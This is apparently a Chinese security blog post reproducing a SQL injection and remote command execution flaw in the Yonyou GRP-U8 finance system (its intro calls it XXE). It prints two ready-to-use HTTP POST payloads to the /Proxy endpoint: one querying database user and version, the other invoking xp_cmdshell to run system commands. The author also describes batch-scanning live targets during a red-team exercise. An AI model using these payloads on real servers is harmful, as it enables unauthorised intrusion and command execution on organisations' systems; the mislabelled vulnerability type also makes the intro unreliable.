![1610719188_60019fd4eb85443e3ab8c.jpg!small](https://image.3001.net/images/20210115/1610719188_60019fd4eb85443e3ab8c.jpg!small)

用友GRP-u8 注入-RCE漏洞复现

（HW第一时间复现了，当时觉得不合适，现在才发出来）

## 一、漏洞简介

用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载恶意外部文件。

## 二、漏洞复现

SQL注入POC

POST /Proxy HTTP/1.1Host: localhost:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie:
JSESSIONID=25EDA97813694D1FAFBB74FD7CFFE0Connection: closeContent-Type:
application/x-www-form-urlencodedContent-Length: 371cVer=9.8.0&dp=<?xml
version="1.0"
encoding="GB2312"?>XMLAS_DataRequestProviderNameDataSetProviderDataDataselect
user,db_name(),host_name(),@@version

验证过程

![1610719189_60019fd5733e70001fb69.png!small](https://image.3001.net/images/20210115/1610719189_60019fd5733e70001fb69.png!small)

![1610719190_60019fd65dbd3bc9f4d87.png!small](https://image.3001.net/images/20210115/1610719190_60019fd65dbd3bc9f4d87.png!small)

批量跑了一部分（这个是HW期间第一时间跑的）现在估计没啥了

![1610719190_60019fd6b4496b4083586.png!small](https://image.3001.net/images/20210115/1610719190_60019fd6b4496b4083586.png!small)

Rce注入EXP

POST /Proxy HTTP/1.1Host: localhost:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie:
JSESSIONID=25EDA978136924D1FAFBB74FD7CFFE0Connection: closeContent-Type:
application/x-www-form-urlencodedContent-Length: 355cVer=9.8.0&dp=<?xml
version="1.0"
encoding="GB2312"?>XMLAS_DataRequestProviderNameDataSetProviderDataDataexec
xp_cmdshell 'ipconfig'

![1610719191_60019fd77aa67258a7eb3.png!small](https://image.3001.net/images/20210115/1610719191_60019fd77aa67258a7eb3.png!small)

![1610719191_60019fd7d12426c324731.png!small](https://image.3001.net/images/20210115/1610719191_60019fd7d12426c324731.png!small)

## 参考：

https://www.cnblogs.com/0day-li/p/13652897.html

https://www.uedbox.com/post/14953/

https://www.cnblogs.com/Yang34/p/13653960.html

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1610719192_60019fd82998a6aef84e1.jpg!small](https://image.3001.net/images/20210115/1610719192_60019fd82998a6aef84e1.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

![1610719192_60019fd8a2da8822fdad5.png!small](https://image.3001.net/images/20210115/1610719192_60019fd8a2da8822fdad5.png!small)

  

